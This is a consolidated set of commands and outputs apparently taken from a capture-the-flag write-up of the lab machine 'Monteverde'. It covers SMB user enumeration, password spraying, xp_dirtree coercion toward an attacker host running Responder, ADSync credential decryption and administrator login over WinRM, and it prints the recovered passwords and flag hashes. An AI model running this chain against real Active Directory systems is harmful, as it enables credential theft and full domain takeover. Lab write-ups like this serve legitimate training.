# Commands and Outputs — Consolidated

This file consolidates fenced code blocks (commands and their outputs) extracted from the report markdown files to assist reproducibility and quick review.

## Source: `Monteverde/02-Enumeration.md`

### Block 1

```
sudo nmap -sC -sV -oN logs/nmap.init 10.10.10.172
```

### Block 2

```
enum4linux-ng -U 10.10.10.172 | grep "username:" | awk '{ print $2 }' > user.list
```

### Block 3

```
netexec smb 10.10.10.172 -u user.list -p pass.list
# Result: MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

## Source: `Monteverde/04-MSSQL.md`

### Block 1

```
sqlcmd -Q "select name,create_date from sys.databases"
```

### Block 2

```
Invoke-SQLAudit -Verbose
# Vulnerability: Excessive Privilege - Execute xp_dirtree
```

### Block 3

```
# On attacker host
sudo responder -I tun0
# On target via sqlcmd or PowerShell
sqlcmd -Q "xp_dirtree '\\\\10.10.14.6\\test'"
```

### Block 4

```
USE ADSync; SELECT private_configuration_xml, encrypted_configuration from mms_management_agent
```

## Source: `Monteverde/03-Foothold.md`

### Block 1

```
smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs
# azure_uploads  READ ONLY
```

### Block 2

```
<Props>
  <S N="Password">4n0therD4y@n0th3r$</S>
</Props>
```

### Block 3

```
netexec winrm 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
# Result: MEGABANK.LOCAL\mhope authenticated
```

### Block 4

```
Type C:\Users\mhope\Desktop\user.txt
# b9a355bd318db6299e9d1135b1391cd4
```

## Source: `Monteverde/05-Privesc.md`

### Block 1

```
# Example: connect to local ADSync database and run decrypt script
$client = New-Object System.Data.SqlClient.SqlConnection -ArgumentList "Server=localhost; Integrated Security=true;Initial Catalog=ADSync"
$client.Open()
# Run POC; returned password: d0m@in4dminyeah!
```

### Block 2

```
evil-winrm-py -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'
# Obtained root flag: ce0899bf0e75ac4ced4945bd00e6613b
```

